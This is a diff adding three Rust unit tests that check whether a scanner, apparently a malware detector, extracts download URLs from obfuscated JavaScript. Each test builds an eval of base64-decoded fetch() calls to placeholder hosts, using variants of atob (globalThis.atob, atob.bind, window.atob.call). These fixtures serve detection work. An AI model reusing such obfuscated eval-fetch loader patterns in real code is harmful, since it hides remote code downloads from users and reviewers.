@@ -18038,6 +18038,28 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_globalthis_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://globalthis-atob-js.example/p')",
+        );
+        let js = format!(r#"eval(globalThis.atob("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://globalthis-atob-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS globalThis.atob payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_template_literal_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
@@ -19505,6 +19527,50 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS atob.call payload URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_atob_bind_invoke_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-bind-invoke-js.example/p')",
+        );
+        let js = format!(r#"eval(atob.bind(window)("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-bind-invoke-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob.bind invoke payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_window_atob_call_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://window-atob-call-js.example/p')",
+        );
+        let js = format!(r#"eval(window.atob.call(null, "{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://window-atob-call-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS window.atob.call payload URL missed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
